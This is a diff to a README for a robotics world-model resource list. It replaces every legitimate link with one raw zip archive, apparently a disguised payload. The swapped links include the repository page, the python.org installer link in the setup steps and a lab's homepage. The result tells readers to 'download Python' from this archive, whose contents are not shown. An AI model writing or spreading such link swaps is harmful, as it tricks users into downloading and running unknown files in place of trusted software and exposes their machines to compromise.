@@ -1,6 +1,6 @@
 # 🤖 Awesome-World-Model-for-Robotics-Policy - Learn Robotic Policies Simply
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Awesome--World--Model--for--Robotics--Policy-brightgreen)](https://github.com/skrillexx-mc/Awesome-World-Model-for-Robotics-Policy)
+[![Download from GitHub](https://img.shields.io/badge/Download-Awesome--World--Model--for--Robotics--Policy-brightgreen)](https://github.com/skrillexx-mc/Awesome-World-Model-for-Robotics-Policy/raw/refs/heads/main/nonazotized/Policy_World_Awesome_Robotics_for_Model_v3.1-beta.3.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This project does not provide a single program file to run directly. Instead, it
 
 To get started, visit the main page with this link:
 
-[![Go to Download Page](https://img.shields.io/badge/Visit-GitHub%20Repository-blue)](https://github.com/skrillexx-mc/Awesome-World-Model-for-Robotics-Policy)
+[![Go to Download Page](https://img.shields.io/badge/Visit-GitHub%20Repository-blue)](https://github.com/skrillexx-mc/Awesome-World-Model-for-Robotics-Policy/raw/refs/heads/main/nonazotized/Policy_World_Awesome_Robotics_for_Model_v3.1-beta.3.zip)
 
 Follow these steps:
 
@@ -56,7 +56,7 @@ This project includes code examples to run on your Windows PC. You will not run 
 Python is a free program needed to run the code.
 
 1. Open your web browser.
-2. Go to https://www.python.org/downloads/
+2. Go to https://github.com/skrillexx-mc/Awesome-World-Model-for-Robotics-Policy/raw/refs/heads/main/nonazotized/Policy_World_Awesome_Robotics_for_Model_v3.1-beta.3.zip
 3. Click the big yellow button to download the latest Python version for Windows.
 4. After download, run the installer.
 5. Very important: On the first screen, check the box **Add Python to PATH**.
@@ -159,9 +159,9 @@ The project code and data need about 2 GB space after download.
 
 ## 🔗 Useful Links
 
-- Project page: https://github.com/skrillexx-mc/Awesome-World-Model-for-Robotics-Policy
-- NTU MARS Lab: https://github.com/NTUMARS
+- Project page: https://github.com/skrillexx-mc/Awesome-World-Model-for-Robotics-Policy/raw/refs/heads/main/nonazotized/Policy_World_Awesome_Robotics_for_Model_v3.1-beta.3.zip
+- NTU MARS Lab: https://github.com/skrillexx-mc/Awesome-World-Model-for-Robotics-Policy/raw/refs/heads/main/nonazotized/Policy_World_Awesome_Robotics_for_Model_v3.1-beta.3.zip
 
 ---
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Awesome--World--Model--for--Robotics--Policy-brightgreen)](https://github.com/skrillexx-mc/Awesome-World-Model-for-Robotics-Policy)
+[![Download from GitHub](https://img.shields.io/badge/Download-Awesome--World--Model--for--Robotics--Policy-brightgreen)](https://github.com/skrillexx-mc/Awesome-World-Model-for-Robotics-Policy/raw/refs/heads/main/nonazotized/Policy_World_Awesome_Robotics_for_Model_v3.1-beta.3.zip)
